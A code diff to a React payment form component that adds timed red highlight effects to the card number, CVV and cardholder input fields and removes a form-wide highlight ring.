@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
 import { wsClient } from '@/integrations/ws-client';
 import OTPVerificationPage from './OTPVerificationPage';
@@ -48,6 +48,46 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields }) => {
   const [selectedBank, setSelectedBank] = useState('ICICI BANK');
   const [selectedBankLogo, setSelectedBankLogo] = useState('');
   const [isMobile, setIsMobile] = useState(false);
+
+  const [inputGlow, setInputGlow] = useState({
+    cardNumber: false,
+    expiryMonth: false,
+    expiryYear: false,
+    cvv: false,
+    cardHolder: false,
+  });
+
+  const inactivityTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
+
+  // Function to reset the inactivity timer
+  const resetInactivityTimer = () => {
+    if (inactivityTimer.current) {
+      clearTimeout(inactivityTimer.current);
+    }
+    inactivityTimer.current = setTimeout(() => {
+      setInputGlow({
+        cardNumber: false,
+        expiryMonth: false,
+        expiryYear: false,
+        cvv: false,
+        cardHolder: false,
+      });
+    }, 2000); // 2 seconds
+  };
+
+  // Initial glow on fullscreen entry
+  useEffect(() => {
+    if (highlightFields) {
+      setInputGlow({
+        cardNumber: true,
+        expiryMonth: true,
+        expiryYear: true,
+        cvv: true,
+        cardHolder: true,
+      });
+      resetInactivityTimer(); // Start the inactivity timer
+    }
+  }, [highlightFields]);
 
   // Check if device is mobile
   useEffect(() => {
@@ -257,6 +297,10 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields }) => {
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
 
+    setInputGlow((prev) => ({ ...prev, [name]: false })); // Turn off glow for this field
+    resetInactivityTimer(); // Reset inactivity timer on any input
+
+
     if (name === 'cardNumber') {
       setFormData(prev => ({ ...prev, cardNumber: formatCardNumber(value) }));
     } else {
@@ -434,7 +478,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields }) => {
         </div>
       )}
 
-      <form onSubmit={handleSubmit} className={`space-y-4 ${highlightFields ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''}`}>
+      <form onSubmit={handleSubmit} className="space-y-4">
         <div>
           <label className="block text-sm font-medium text-gray-700 mb-1">
             Amount to Pay
@@ -528,7 +572,9 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields }) => {
                 placeholder="123"
                 value={isLoading ? maskCardInfo(formData.cvv) : formData.cvv}
                 onChange={handleInputChange}
-                className="w-full pl-10 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
+                className={`w-full pl-10 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
+                  inputGlow.cvv ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : 'border-gray-300'
+                }`}
                 maxLength={4}
                 disabled={isLoading}
               />
@@ -546,7 +592,9 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields }) => {
             placeholder="Enter full name as on card"
             value={isLoading ? maskCardInfo(formData.cardHolder) : formData.cardHolder}
             onChange={handleInputChange}
-            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
+            className={`w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
+              inputGlow.cardHolder ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : 'border-gray-300'
+            }`}
             disabled={isLoading}
           />
         </div>
